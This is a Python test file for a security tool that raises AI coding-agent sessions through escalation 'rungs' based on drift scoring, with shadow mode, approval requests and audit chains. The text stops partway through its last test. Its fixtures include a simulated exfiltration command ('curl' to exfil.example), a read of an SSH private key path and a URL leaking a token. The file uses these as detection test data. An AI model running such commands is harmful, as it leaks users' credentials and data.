"""
Response rungs 1 to 3, shadow first: trigger table, hysteresis, cooldown,
shadow records and never applies, mode gate, audit chain, and a replay over
whole sessions (normal ones stay at observe, drifting ones reach step-up).
"""

import asyncio
import json
import sqlite3
from datetime import datetime, timedelta, timezone

import pytest

from securevector.app.database.connection import DatabaseConnection
from securevector.app.database.migrations import (
    ensure_response_rung_tables,
    ensure_session_drift_table,
    migrate_to_v59,
    run_migrations,
)
from securevector.app.database.repositories.custom_tools import CustomToolsRepository
from securevector.app.database.repositories.response_rungs import ResponseRungsRepository
from securevector.app.services import response_rungs as rr
from securevector.app.services import session_drift as drift

T0 = datetime(2026, 10, 9, 12, 0, 0, tzinfo=timezone.utc)
HARNESS = "claude-code"
KNOWN = ("Read", "Edit", "Bash", "Grep")
UNSEEN = ("WebFetch", "NotebookEdit", "mcp__x__dump", "Task", "KillShell", "Glob")


def at(minutes):
    return T0 + timedelta(minutes=minutes)


def sig(band=None, score=None, n=0, moved=False, red=False, deny=0):
    return rr.Signals(band, score, f"c{n}", moved, red, deny)


def run(states, seq):
    """seq: (minutes, Signals) pairs; returns the list of rungs."""
    out, s = [], states
    for minutes, g in seq:
        s = rr.step(s, g, at(minutes))
        out.append(s.rung)
    return out, s


# --- trigger table ----------------------------------------------------------------


def test_drift_watch_twice_flags_high_twice_steps_up():
    rungs, _ = run(rr.RungState(), [(0, sig("watch", 45, 1)), (1, sig("watch", 45, 2))])
    assert rungs == [1, 2]
    rungs, _ = run(rr.RungState(), [(0, sig("high", 80, 1)), (1, sig("high", 80, 2))])
    assert rungs == [1, 3]


def test_one_compute_never_steps_up_and_a_repeat_read_does_not_count():
    s = rr.step(rr.RungState(), sig("high", 90, 1), at(0))
    assert s.rung == 1
    s = rr.step(s, sig("high", 90, 1), at(1))  # same compute read again
    assert s.rung == 1
    s = rr.step(s, sig("calm", 5, 2), at(2))   # the streak breaks
    s = rr.step(s, sig("high", 90, 3), at(3))
    assert s.rung == 1


def test_config_change_flags_but_red_needs_the_band():
    _, s = run(rr.RungState(), [(0, sig("calm", 5, 1, moved=True, red=True))])
    assert s.rung == 2
    _, s = run(rr.RungState(), [(0, sig("watch", 45, 1, moved=True, red=True))])
    assert s.rung == 3
    _, s = run(rr.RungState(), [(0, sig("calm", 5, 1, moved=True))])
    assert s.rung == 2


def test_attempt_after_deny_rows():
    assert rr.step(rr.RungState(), sig("calm", 5, 1, deny=1), at(0)).rung == 2
    assert rr.step(rr.RungState(), sig("calm", 5, 1, deny=3), at(0)).rung == 3
    assert rr.step(rr.RungState(), sig("watch", 45, 1, deny=1), at(0)).rung == 3


def test_rung_is_the_max_over_signals():
    s = rr.step(rr.RungState(), sig("calm", 5, 1, moved=True, deny=3), at(0))
    assert s.rung == 3 and set(s.reasons) == {"deny"}


# --- hysteresis and cooldown ------------------------------------------------------


def _at_three():
    return run(rr.RungState(), [(0, sig("high", 80, 1)), (1, sig("high", 80, 2))])[1]


def test_step_down_needs_score_below_60_and_five_quiet_minutes():
    s = _at_three()
    s = rr.step(s, sig("watch", 60, 3), at(7))      # 60 is not below 60
    assert s.rung == 3
    s = rr.step(s, sig("calm", 59, 4), at(8))
    assert s.rung == 2


def test_step_down_waits_while_the_rung_three_signal_is_recent():
    s = _at_three()
    s = rr.step(s, sig("calm", 10, 3), at(3))       # last rung-3 signal at minute 1
    assert s.rung == 3
    s = rr.step(s, sig("calm", 10, 4), at(7))
    assert s.rung == 2


def test_two_to_one_needs_score_below_30():
    s = rr.step(rr.RungState(), sig("calm", 5, 1, moved=True), at(0))
    assert s.rung == 2
    # The setup signal clears (moved False) but the score is still 35.
    s = rr.step(s, sig("calm", 35, 2), at(10))
    assert s.rung == 2
    s = rr.step(s, sig("calm", 29, 3), at(11))
    assert s.rung == 1


def test_cooldown_blocks_same_kind_but_not_a_different_kind():
    s = _at_three()
    s = rr.step(s, sig("calm", 10, 3), at(8))       # down to 2, cooldown starts
    s = rr.step(s, sig("calm", 10, 4), at(14))      # down to 1 (quiet again)
    assert s.rung == 1
    s = rr.step(s, sig("high", 80, 5), at(15))
    s = rr.step(s, sig("high", 80, 6), at(16))      # drift again within 10 min of the step-down
    assert s.rung == 1
    s = rr.step(s, sig("high", 80, 7, deny=3), at(17))  # a different kind may step up
    assert s.rung == 3


def test_release_pins_to_observe_and_evaluation_stops():
    s = rr.release(_at_three(), at(2))
    assert s.rung == 1 and s.pinned
    s = rr.step(s, sig("high", 95, 9, deny=5), at(3))
    assert s.rung == 1


def test_rung_has_no_verdict_input_or_output():
    # The engine takes counts and returns a rung; it carries no verdict.
    assert not hasattr(rr, "apply") and not hasattr(rr, "stop")
    assert rr.active_rung({"mode": "shadow", "rung": 3}) == 1
    assert rr.active_rung({"mode": "active", "rung": 3}) == 3


# --- storage, audit, mode gate ----------------------------------------------------


class World:
    def __init__(self, tmp_path):
        tmp_path.mkdir(parents=True, exist_ok=True)
        self.path = tmp_path / "rungs.db"
        self.db = DatabaseConnection(self.path)
        asyncio.run(run_migrations(self.db))
        asyncio.run(ensure_session_drift_table(self.db))
        asyncio.run(ensure_response_rung_tables(self.db))
        self.raw = sqlite3.connect(self.path)
        self.n = 0
        drift.clear_cache()

    def task(self, sid, workspace="/w/app", ended=True, executor=HARNESS, days_ago=1):
        self.n += 1
        now = datetime.now(timezone.utc)
        self.raw.execute(
            "INSERT INTO terminal_tasks (id, executor_id, workspace, status, session_id, created_at, ended_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (f"t{self.n}-{sid}", executor, workspace, "done" if ended else "working", sid,
             (now - timedelta(days=days_ago, hours=1)).isoformat(timespec="milliseconds"),
             (now - timedelta(days=days_ago)).isoformat(timespec="milliseconds") if ended else None),
        )
        self.raw.commit()
        return f"t{self.n}-{sid}"

    def calls(self, sid, rows, start=None, runtime=HARNESS):
        t0 = start or (datetime.now(timezone.utc) - timedelta(hours=2))
        self.raw.executemany(
            "INSERT INTO tool_call_audit (tool_id, function_name, action, args_preview, reason, called_at, "
            "session_id, runtime_kind) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            [(t, t, a, p, r, (t0 + timedelta(seconds=5 * i)).strftime("%Y-%m-%d %H:%M:%S"), sid, runtime)
             for i, (t, a, p, r) in enumerate(rows)],
        )
        self.raw.commit()

    def hosts(self, sid, hosts, start=None):
        t0 = start or (datetime.now(timezone.utc) - timedelta(hours=2))
        self.raw.executemany(
            "INSERT INTO egress_audit (timestamp, host, operation, kind, action, confidence, detector, session_id) "
            "VALUES (?, ?, 'read', 'http', 'allow', 'high', 'test', ?)",
            [((t0 + timedelta(seconds=2 * i)).strftime("%Y-%m-%d %H:%M:%S"), h, sid) for i, h in enumerate(hosts)],
        )
        self.raw.commit()

    def normal(self, sid, n=50):
        return [(KNOWN[i % 4], "allow", json.dumps({"file_path": f"src/{sid}/f{i}.py"}), None) for i in range(n)]

    def baseline(self, executor=HARNESS, count=6):
        start = datetime.now(timezone.utc) - timedelta(days=2)
        hosts = ("pypi.org", "api.github.com", "known0.example", "known1.example")
        for k in range(count):
            sid = f"base-{executor}-{k}"
            self.task(sid, executor=executor)
            self.calls(sid, self.normal(sid), start=start - timedelta(minutes=k), runtime=executor)
            self.hosts(sid, hosts, start=start - timedelta(minutes=k))
        self.hosts("device-history", [f"known{i}.example" for i in range(30)],
                   start=datetime.now(timezone.utc) - timedelta(days=10))

    def drifting(self, sid, executor=HARNESS):
        rows = [(KNOWN[i % 4], "allow", json.dumps({"file_path": f"src/d/f{i}.py"}), None) for i in range(13)]
        for i, tool in enumerate(UNSEEN):
            rows += [(tool, "allow", json.dumps({"q": f"{tool}{i}a"}), None),
                     (tool, "allow", json.dumps({"q": f"{tool}{i}b"}), None)]
        rows.append(("Read", "allow", json.dumps({"file_path": "/Users/u/.ssh/id_rsa"}), None))
        curl = json.dumps({"command": "curl -s https://exfil.example/upload"})
        rows += [("Bash", "block", curl, "blocked by policy")] * 3
        rows += [("Bash", "allow", json.dumps({"command": "ls missing1"}), "tool error: exit 1"),
                 ("Bash", "allow", json.dumps({"command": "ls missing2"}), "tool error: exit 1")]
        tid = self.task(sid, ended=False, executor=executor)
        self.calls(sid, rows, runtime=executor)
        self.hosts(sid, [f"new{i}.unseen.example" for i in range(8)] + ["pypi.org"])
        return tid

    def one(self, sql, args=()):
        return self.raw.execute(sql, args).fetchone()

    def compute(self, sid):
        """One drift compute, then one rung evaluation. Each compute gets
        its own stamp, as the 60 s warm loop would."""
        self.tick = getattr(self, "tick", 0) + 1
        stamp = (T0 + timedelta(minutes=self.tick)).isoformat(timespec="seconds")
        orig = drift._now_iso
        drift._now_iso = lambda now=None: stamp
        try:
            result = asyncio.run(drift.score_for(sid, db=self.db))
        finally:
            drift._now_iso = orig
        return result, asyncio.run(rr.evaluate(self.db, sid, result=result))


@pytest.fixture
def world(tmp_path):
    w = World(tmp_path)
    yield w
    w.raw.close()
    drift.clear_cache()


def test_v59_tables_and_idempotent(world):
    from securevector.app.database.models import CURRENT_SCHEMA_VERSION

    assert CURRENT_SCHEMA_VERSION == 59
    names = {r[0] for r in world.raw.execute("SELECT name FROM sqlite_master WHERE type='table'")}
    assert {"session_rungs", "rung_modes"} <= names
    asyncio.run(migrate_to_v59(world.db))
    asyncio.run(migrate_to_v59(world.db))
    assert world.one("SELECT MAX(version) FROM schema_version")[0] == 59


def test_default_mode_is_shadow_and_active_is_refused_early(world):
    p = asyncio.run(rr.shadow_progress(world.db, HARNESS, T0))
    assert p["mode"] == "shadow" and not p["can_activate"]
    with pytest.raises(rr.ModeError):
        asyncio.run(rr.set_mode(world.db, HARNESS, "active", T0))
    assert asyncio.run(rr.shadow_progress(world.db, HARNESS, T0))["mode"] == "shadow"
    with pytest.raises(rr.ModeError):
        asyncio.run(rr.set_mode(world.db, HARNESS, "bogus", T0))


def _ended_shadow_sessions(world, n, peak=1, feedback=None):
    repo = ResponseRungsRepository(world.db)
    for i in range(n):
        st = rr.RungState(rung=peak, peak_rung=peak)
        asyncio.run(repo.upsert(f"s{peak}-{i}", None, HARNESS, "shadow", st, rr._iso(T0), True))
        if feedback:
            asyncio.run(repo.set_feedback(f"s{peak}-{i}", feedback))


def test_shadow_period_needs_sessions_days_and_zero_unintended(world):
    asyncio.run(rr.shadow_progress(world.db, HARNESS, T0))
    _ended_shadow_sessions(world, 10)
    p = asyncio.run(rr.shadow_progress(world.db, HARNESS, T0 + timedelta(days=6)))
    assert p["sessions"] == 10 and p["days"] == 6 and not p["complete"]
    p = asyncio.run(rr.shadow_progress(world.db, HARNESS, T0 + timedelta(days=7)))
    assert p["complete"] and p["unintended"] == 0
    out = asyncio.run(rr.set_mode(world.db, HARNESS, "active", T0 + timedelta(days=7)))
    assert out["mode"] == "active"
    out = asyncio.run(rr.set_mode(world.db, HARNESS, "shadow", T0 + timedelta(days=7)))
    assert out["mode"] == "shadow"


def test_an_unintended_step_up_blocks_completion(world):
    asyncio.run(rr.shadow_progress(world.db, HARNESS, T0))
    _ended_shadow_sessions(world, 10)
    _ended_shadow_sessions(world, 1, peak=3, feedback="not_needed")
    p = asyncio.run(rr.shadow_progress(world.db, HARNESS, T0 + timedelta(days=8)))
    assert p["unintended"] == 1 and not p["complete"] and not p["can_activate"]


def test_changed_weights_restart_shadow(world, monkeypatch):
    asyncio.run(rr.shadow_progress(world.db, HARNESS, T0))
    _ended_shadow_sessions(world, 10)
    monkeypatch.setattr(drift, "WATCH_FROM", 41)
    p = asyncio.run(rr.shadow_progress(world.db, HARNESS, T0 + timedelta(days=9)))
    assert p["sessions"] == 0 and p["days"] == 0 and p["mode"] == "shadow"


def test_early_end_flag_allows_active_and_lists_what_shadow_did(world):
    asyncio.run(rr.shadow_progress(world.db, HARNESS, T0))
    _ended_shadow_sessions(world, 2, peak=3)
    seen = asyncio.run(rr.shadow_would_have(world.db, HARNESS, T0))
    assert seen["count"] == 2
    asyncio.run(rr.end_shadow_early(world.db, HARNESS, T0))
    assert asyncio.run(rr.set_mode(world.db, HARNESS, "active", T0))["mode"] == "active"


# --- replay over whole sessions ----------------------------------------------------


def _jit_rows(world):
    return world.one("SELECT COUNT(*) FROM jit_access_requests")[0]


def test_replay_normal_sessions_never_step_up_across_harnesses(world):
    for executor in (HARNESS, "codex", "gemini"):
        world.baseline(executor=executor)
        sid = f"normal-{executor}"
        world.task(sid, ended=False, executor=executor)
        world.calls(sid, world.normal(sid), runtime=executor)
        world.hosts(sid, ("pypi.org", "api.github.com"))
        for _ in range(4):
            result, row = world.compute(sid)
            assert result.band == drift.BAND_CALM
            assert row["rung"] == 1 and row["peak_rung"] == 1
    assert _jit_rows(world) == 0
    assert world.one("SELECT COUNT(*) FROM tool_call_audit WHERE tool_id = 'sv.response_rung'")[0] == 0


def test_replay_drifting_session_steps_up_within_three_computes_in_shadow(world):
    world.baseline()
    world.drifting("s-drift")
    rungs = []
    for _ in range(3):
        result, row = world.compute("s-drift")
        assert result.band == drift.BAND_HIGH
        rungs.append(row["rung"])
    assert rungs[0] == 1 and rungs[-1] == 3 and rungs.index(3) <= 2
    assert row["mode"] == "shadow" and rr.active_rung(row) == 1
    # Shadow applies nothing: no approval request, no verdict change.
    assert _jit_rows(world) == 0
    names = [r[0] for r in world.raw.execute(
        "SELECT function_name FROM tool_call_audit WHERE tool_id = 'sv.response_rung' ORDER BY id")]
    assert names[-1] == "rung.shadow_stepup" and set(names) <= {"rung.flag", "rung.shadow_stepup"}
    assert world.one("SELECT COUNT(*) FROM tool_call_audit WHERE session_id = 's-drift' AND tool_id != 'sv.response_rung' "
                     "AND action = 'allow' AND function_name = 'Read'")[0] >= 1  # verdict rows untouched
    # Audit rows carry ids and counts, no request text.
    previews = [r[0] for r in world.raw.execute(
        "SELECT args_preview FROM tool_call_audit WHERE tool_id = 'sv.response_rung'")]
    assert all("exfil" not in p and ".ssh" not in p and "curl" not in p for p in previews)
    # Rows go through the chained audit write (the fixture rows are raw inserts,
    # so the chain walk itself is covered by the audit tests).
    assert world.one("SELECT COUNT(*) FROM tool_call_audit WHERE tool_id = 'sv.response_rung' "
                     "AND row_hash IS NOT NULL AND seq IS NOT NULL")[0] == len(names)


def test_two_sessions_one_stepped_up_the_other_untouched(world):
    world.baseline()
    world.drifting("s-drift")
    world.task("s-calm", ended=False)
    world.calls("s-calm", world.normal("s-calm"))
    world.hosts("s-calm", ("pypi.org",))
    for _ in range(3):
        world.compute("s-drift")
        _, calm = world.compute("s-calm")
    assert calm["rung"] == 1
    assert world.one("SELECT rung FROM session_rungs WHERE session_id = 's-drift'")[0] == 3


def test_release_session_pins_observe_and_audits(world):
    world.baseline()
    world.drifting("s-drift")
    for _ in range(3):
        world.compute("s-drift")
    row = asyncio.run(rr.release_session(world.db, "s-drift"))
    assert row["rung"] == 1 and row["pinned"] == 1
    _, row = world.compute("s-drift")
    assert row["rung"] == 1
    assert world.one("SELECT COUNT(*) FROM tool_call_audit WHERE function_name = 'rung.release'")[0] == 1


def test_ended_session_counts_once_toward_shadow(world):
    world.baseline()
    world.task("s-end", ended=True)
    world.calls("s-end", world.normal("s-end"))
    asyncio.run(rr.shadow_progress(world.db, HARNESS))
    world.compute("s-end")
    world.compute("s-end")
    assert asyncio.run(rr.shadow_progress(world.db, HARNESS))["sessions"] == 1


def test_routes_are_registered_under_terminals():
    from securevector.app.terminals.routes import router

    paths = {r.path for r in router.routes}
    assert {"/terminals/tasks/{task_id}/rung", "/terminals/rungs/modes",
            "/terminals/rungs/modes/{harness}"} <= paths
    posts = {r.path for r in router.routes if "rung" in r.path and "POST" in r.methods}
    assert posts == {"/terminals/tasks/{task_id}/rung/release", "/terminals/tasks/{task_id}/rung/feedback",
                     "/terminals/rungs/modes/{harness}"}


# --- review fixes -------------------------------------------------------------------


def _decision(world, jti, issued, attempted=None, sid="s-att"):
    world.raw.execute(
        "INSERT OR IGNORE INTO logical_sessions (handle, binding, harness_session_id, created_at, last_seen_at) "
        "VALUES ('h-att', 'verified', ?, '2026-10-09T00:00:00', '2026-10-09T00:00:00')", (sid,))
    world.raw.execute(
        "INSERT INTO policy_decisions (jti, session, action_kind, action_hash, target_hash, decision, reason, "
        "issued_at, attempted_after_deny, attempted_at) VALUES (?, 'h-att', 'exec', 'a', 't', 'deny', 'r', ?, ?, ?)",
        (jti, issued, 1 if attempted else 0, attempted))
    world.raw.commit()


def test_attempt_window_counts_from_the_attempt_not_the_issue(world):
    from securevector.app.database.repositories.policy_decisions import PolicyDecisionsRepository

    now = datetime(2026, 10, 9, 12, 0, 0)
    f = lambda m: (now + timedelta(minutes=m)).strftime("%Y-%m-%dT%H:%M:%S")  # noqa: E731
    repo = PolicyDecisionsRepository(world.db)
    since = f(-10)
    _decision(world, "j1", f(-19), attempted=f(-1))   # issued long ago, attempted 1 min ago
    assert asyncio.run(repo.recent_attempts_after_deny("s-att", None, since)) == 1
    _decision(world, "j2", f(-9), attempted=f(-11))   # issued inside, attempted outside
    assert asyncio.run(repo.recent_attempts_after_deny("s-att", None, since)) == 1
    # Attempt 9 min after issue still counts for the full 10 minutes after the attempt.
    assert asyncio.run(repo.recent_attempts_after_deny("s-att", None, f(-1 - 10 + 0))) == 2


def test_marking_an_attempt_stamps_attempted_at(world):
    from securevector.app.database.repositories.policy_decisions import PolicyDecisionsRepository

    _decision(world, "j3", "2026-10-09T11:00:00")
    assert asyncio.run(PolicyDecisionsRepository(world.db).mark_attempted_after_deny("j3"))
    assert world.one("SELECT attempted_at FROM policy_decisions WHERE jti = 'j3'")[0]


def test_early_end_survives_on_a_fresh_harness(world):
    asyncio.run(rr.end_shadow_early(world.db, "codex", T0))
    p = asyncio.run(rr.shadow_progress(world.db, "codex", T0))
    assert p["early_ended"] and p["can_activate"]
    assert asyncio.run(rr.set_mode(world.db, "codex", "active", T0))["mode"] == "active"


def test_get_reads_write_nothing(world):
    before = world.one("SELECT COUNT(*) FROM rung_modes")[0]
    p = asyncio.run(rr.shadow_progress(world.db, "gemini", T0, read_only=True))
    w = asyncio.run(rr.shadow_would_have(world.db, "gemini", T0, read_only=True))
    assert p["mode"] == "shadow" and w["count"] == 0
    assert world.one("SELECT COUNT(*) FROM rung_modes")[0] == before


def test_a_session_keeps_the_mode_it_started_under(world):
    world.baseline()
    world.drifting("s-drift")
    for _ in range(3):
        _, row = world.compute("s-drift")
    assert row["rung"] == 3 and row["mode"] == "shadow"
    _ended_shadow_sessions(world, 10)
    asyncio.run(rr.end_shadow_early(world.db, HARNESS))
    asyncio.run(rr.set_mode(world.db, HARNESS, "active"))
    _, row = world.compute("s-drift")
    assert row["mode"] == "shadow" and rr.active_rung(row) == 1


def test_audit_chain_verifies_after_rung_writes(tmp_path):
    w = World(tmp_path)
    try:
        res = drift.DriftResult(80, "high", drift.STATUS_SCORED, [], True, "c1")
        task = {"id": "t1", "executor_id": HARNESS}
        for n in (1, 2):
            res = drift.DriftResult(80, "high", drift.STATUS_SCORED, [], True, f"c{n}")
            asyncio.run(rr.evaluate(w.db, "s-chain", task=task, result=res))
        assert w.one("SELECT COUNT(*) FROM tool_call_audit WHERE tool_id = 'sv.response_rung'")[0] >= 1
        chain = asyncio.run(CustomToolsRepository(w.db).verify_audit_chain())
        assert chain["ok"] is True, chain
    finally:
        w.raw.close()


def test_concurrent_evaluations_match_serial_and_release_locks(tmp_path):
    w = World(tmp_path)
    try:
        task = {"id": "t1", "executor_id": HARNESS}
        res = drift.DriftResult(80, "high", drift.STATUS_SCORED, [], True, "c1")

        async def both():
            return await asyncio.gather(
                rr.evaluate(w.db, "s-race", task=task, result=res),
                rr.evaluate(w.db, "s-race", task=task, result=res),
            )

        asyncio.run(both())
        for _ in (1, 2):
            asyncio.run(rr.evaluate(w.db, "s-seq", task=task, result=res))
        raced = asyncio.run(ResponseRungsRepository(w.db).get("s-race"))
        serial = asyncio.run(ResponseRungsRepository(w.db).get("s-seq"))
        keys = ("rung", "peak_rung", "streak_watch", "streak_high", "last_drift_at")
        assert {k: raced[k] for k in keys} == {k: serial[k] for k in keys}
        assert rr._SESSION_LOCKS == {}
    finally:
        w.raw.close()


# --- part 2: step-up in active mode, release, mode routes ---------------------------


def _rows(world, sid):
    from securevector.app.server.routes import tool_permissions as tp

    return asyncio.run(tp.get_synced_overrides(runtime=HARNESS, session_id=sid))["synced"]


def _at_rung(world, sid, mode, rung=3, workspace="/w/app"):
    world.task(sid, ended=False, workspace=workspace)
    state = rr.RungState(rung=rung, reasons=["drift"], peak_rung=rung)
    stamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S")
    asyncio.run(ResponseRungsRepository(world.db).upsert(sid, None, HARNESS, mode, state, stamp, False))
    drift.clear_cache()


@pytest.fixture
def gw(world, monkeypatch):
    """World with the routes reading its database and a folder baseline."""
    from securevector.app.server.routes import egress as egress_routes
    from securevector.app.server.routes import jit_access as jit_routes
    from securevector.app.server.routes import tool_permissions as tp

    for mod in (tp, egress_routes, jit_routes):
        monkeypatch.setattr(mod, "get_database", lambda: world.db)
    world.baseline()
    return world


def _held(rows, tool, sid):
    from securevector.app.services import policy_check

    return policy_check.decide_from_overrides(policy_check.tool_candidates(tool) or [tool], rows, sid)[0]


def _egress(world, tool, tool_input, sid):
    from securevector.app.server.routes import egress as egress_routes

    return asyncio.run(egress_routes.evaluate_egress(egress_routes.EvaluateRequest(
        tool_name=tool, tool_input=tool_input, runtime_kind=HARNESS, session_id=sid), None))


def test_step_up_class_by_name_and_by_arguments():
    known = {"Read", "Bash", "WebFetch"}
    assert rr.step_up_kind("Bash") == rr.KIND_SHELL
    assert rr.step_up_kind("Read", baseline_tools=known) is None
    assert rr.step_up_kind("NotebookEdit", baseline_tools=known) == rr.KIND_NEW_TOOL
    assert rr.step_up_kind("NotebookEdit") is None  # no baseline, no novelty
    assert rr.step_up_kind("mcp__securevector__check_policy", baseline_tools=known) is None
    assert rr.step_up_kind("Read", {"file_path": "/Users/u/.ssh/id_rsa"}, baseline_tools=known) == rr.KIND_PATH
    assert rr.step_up_kind("WebFetch", {"url": "https://a.example/?k=KUBE_TOKEN"},
                           baseline_tools=known) == rr.KIND_ENV
    assert rr.step_up_kind("WebFetch", {"url": "https://n.example"}, baseline_tools=known,
                           hosts=["n.example"], baseline_hosts={"pypi.org"}) == rr.KIND_HOST
    assert rr.step_up_kind("WebFetch", {"url": "https://pypi.org"}, baseline_tools=known,
                           hosts=["pypi.org"], baseline_hosts={"pypi.org"}) is None


def test_shadow_files_nothing_and_leaves_the_rows_unchanged(gw):
    _at_rung(gw, "s-shadow", "shadow")
    _at_rung(gw, "s-other", "shadow", rung=1)
    with_rung, without = _rows(gw, "s-shadow"), _rows(gw, "s-other")
    assert with_rung == without and not [r for r in with_rung if r.get("source") == "rung"]
    out = _egress(gw, "WebFetch", {"url": "https://new.unseen.example/x"}, "s-shadow")
    assert out["action"] == "allow"
    asyncio.run(rr.note_call(gw.db, "Bash", "s-shadow", "allow"))
    assert _jit_rows(gw) == 0
    assert gw.one("SELECT would_ask FROM session_rungs WHERE session_id = 's-shadow'")[0] >= 1
    assert asyncio.run(rr.shadow_would_have(gw.db, HARNESS))["would_need_approval"] >= 1


def test_active_rung_three_holds_only_the_step_up_class(gw):
    _at_rung(gw, "s-act", "active")
    rows = _rows(gw, "s-act")
    assert all(r["effect"] == "deny" and r["requestable"] and r["session_id"] == "s-act"
               for r in rows if r.get("source") == "rung")
    assert _held(rows, "Read", "s-act") == "allow"
    assert _held(rows, "Grep", "s-act") == "allow"
    assert _held(rows, "Bash", "s-act") == "needs_approval"
    assert _held(rows, "NotebookEdit", "s-act") == "needs_approval"
    assert not [r for r in rows if r.get("source") == "rung" and "securevector" in r["tool_id"]]
    # The Guard's egress path holds a new-tool network call and files one request.
    out = _egress(gw, "WebFetch", {"url": "https://new.unseen.example/x"}, "s-act")
    assert out["action"] == "block"
    req = gw.one("SELECT tool_id, rule_source, session_id FROM jit_access_requests")
    assert req == ("webfetch", "rung", "s-act")


def test_a_block_stays_a_block(gw):
    from securevector.app.database.repositories.tool_permissions import ToolPermissionsRepository

    asyncio.run(ToolPermissionsRepository(gw.db).upsert_override("Bash", "block"))
    _at_rung(gw, "s-act", "active")
    rows = _rows(gw, "s-act")
    assert not [r for r in rows if r.get("source") == "rung" and r["tool_id"] == "bash"]
    assert _held(rows, "Bash", "s-act") == "deny"


def test_rung_grants_are_session_scoped_and_never_an_allow_row(gw):
    from securevector.app.database.repositories.jit_access import JitAccessRepository

    _at_rung(gw, "s-a", "active")
    _at_rung(gw, "s-b", "active")
    req = asyncio.run(rr.file_request(gw.db, "Bash", "Bash", HARNESS, "s-a"))
    grant = asyncio.run(JitAccessRepository(gw.db).approve_request(req["id"], "15m"))
    assert grant["duration"] == "session" and grant["session_id"] == "s-a"
    rows_a, rows_b = _rows(gw, "s-a"), _rows(gw, "s-b")
    assert _held(rows_a, "Bash", "s-a") == "allow"
    assert not [r for r in rows_a if r.get("source") == "jit_grant"]
    assert _held(rows_b, "Bash", "s-b") == "needs_approval"


def test_the_guard_files_a_rung_request_for_an_allowed_tool(gw):
    from fastapi import HTTPException

    from securevector.app.server.routes import jit_access as jit_routes

    _at_rung(gw, "s-act", "active")
    body = jit_routes.JitRequestCreate(tool_id="Bash", function_name="Bash", runtime_kind=HARNESS, session_id="s-act")
    out = asyncio.run(jit_routes.create_request(body))
    assert out["request"]["rule_source"] == "rung"
    again = asyncio.run(jit_routes.create_request(body))
    assert again["request"]["id"] == out["request"]["id"]
    # The hook decides per call with the input in hand, so any tool id a rung
    # may hold is accepted; run-wide, host, empty and app ids never are.
    read = asyncio.run(jit_routes.create_request(jit_routes.JitRequestCreate(
        tool_id="Read", runtime_kind=HARNESS, session_id="s-act")))
    assert read["request"]["rule_source"] == "rung"
    for tool_id in ("*", "egress:x.example", "sv.response_rung", "mcp__securevector__check_policy", " "):
        with pytest.raises(HTTPException) as e:
            asyncio.run(jit_routes.create_request(jit_routes.JitRequestCreate(
                tool_id=tool_id, runtime_kind=HARNESS, session_id="s-act")))
        assert e.value.status_code in (403, 409), tool_id
    assert gw.one("SELECT COUNT(*) FROM jit_access_requests WHERE tool_id NOT IN ('Bash', 'Read')")[0] == 0
    # A session that is not at active rung 3 files nothing for an allowed tool.
    _at_rung(gw, "s-shadow", "shadow")
    with pytest.raises(HTTPException) as e:
        asyncio.run(jit_routes.create_request(jit_routes.JitRequestCreate(
            tool_id="Bash", runtime_kind=HARNESS, session_id="s-shadow")))
    assert e.value.status_code == 409


def test_twenty_an_hour_then_asks_collapse_into_the_pending_one(gw):
    _at_rung(gw, "s-act", "active")
    ids = {asyncio.run(rr.file_request(gw.db, f"tool{i}", None, HARNESS, "s-act"))["id"] for i in range(20)}
    assert len(ids) == 20
    extra = asyncio.run(rr.file_request(gw.db, "tool-more", None, HARNESS, "s-act"))
    assert extra["id"] in ids
    assert _jit_rows(gw) == 20


def test_release_revokes_grants_and_cancels_pending_requests(gw):
    from securevector.app.database.repositories.jit_access import JitAccessRepository

    _at_rung(gw, "s-act", "active")
    tid = gw.one("SELECT id FROM terminal_tasks WHERE session_id = 's-act'")[0]
    asyncio.run(ResponseRungsRepository(gw.db).upsert(
        "s-act", tid, HARNESS, "active", rr.RungState(rung=3, peak_rung=3), "2026-10-09T12:00:00", False))
    jit = JitAccessRepository(gw.db)
    first = asyncio.run(rr.file_request(gw.db, "Bash", None, HARNESS, "s-act"))
    asyncio.run(jit.approve_request(first["id"], "session"))
    asyncio.run(rr.file_request(gw.db, "NotebookEdit", None, HARNESS, "s-act"))
    row = asyncio.run(rr.release_session(gw.db, "s-act"))
    assert row["rung"] == 1 and row["pinned"] == 1
    assert gw.one("SELECT COUNT(*) FROM jit_access_grants WHERE revoked_at IS NULL")[0] == 0
    assert gw.one("SELECT COUNT(*) FROM jit_access_requests WHERE status = 'pending'")[0] == 0
    assert not [r for r in _rows(gw, "s-act") if r.get("source") == "rung"]
    ev = gw.one("SELECT kind, origin, detail FROM terminal_events WHERE task_id = ? ORDER BY seq DESC", (tid,))
    assert ev == ("rung", "ui", "observe: released")


def test_audit_chain_verifies_after_requests_grants_and_release(tmp_path):
    from securevector.app.database.repositories.jit_access import JitAccessRepository

    w = World(tmp_path)
    try:
        asyncio.run(ResponseRungsRepository(w.db).upsert(
            "s-c", None, HARNESS, "active", rr.RungState(rung=3, peak_rung=3), "2026-10-09T12:00:00", False))
        req = asyncio.run(rr.file_request(w.db, "Bash", None, HARNESS, "s-c"))
        asyncio.run(JitAccessRepository(w.db).approve_request(req["id"], "1h"))
        asyncio.run(rr.note_call(w.db, "Bash", "s-c", "allow"))
        asyncio.run(rr.release_session(w.db, "s-c"))
        asyncio.run(rr.set_mode(w.db, HARNESS, "shadow"))
        assert w.one("SELECT COUNT(*) FROM tool_call_audit WHERE function_name = 'rung.release'")[0] == 1
        chain = asyncio.run(CustomToolsRepository(w.db).verify_audit_chain())
        assert chain["ok"] is True, chain
    finally:
        w.raw.close()


def test_two_sessions_on_one_harness_only_the_stepped_up_one_is_held(gw):
    _at_rung(gw, "s-act", "active")
    gw.task("s-calm", ended=False)
    calm = _rows(gw, "s-calm")
    assert not [r for r in calm if r.get("source") == "rung"]
    assert _held(calm, "Bash", "s-calm") == "allow"
    assert _held(_rows(gw, "s-act"), "Bash", "s-act") == "needs_approval"


def test_check_policy_agrees_with_enforcement(gw):
    from securevector.app.services import policy_check

    _at_rung(gw, "s-act", "active")
    rows = _rows(gw, "s-act")
    cases = [("Read", {"file_path": "src/a.py"}), ("Grep", {"pattern": "x"}), ("Bash", {"command": "ls"}),
             ("NotebookEdit", {"notebook_path": "n.ipynb"}), ("WebFetch", {"url": "https://new.unseen.example/"})]
    for tool, tool_input in cases:
        guard = _held(rows, tool, "s-act")
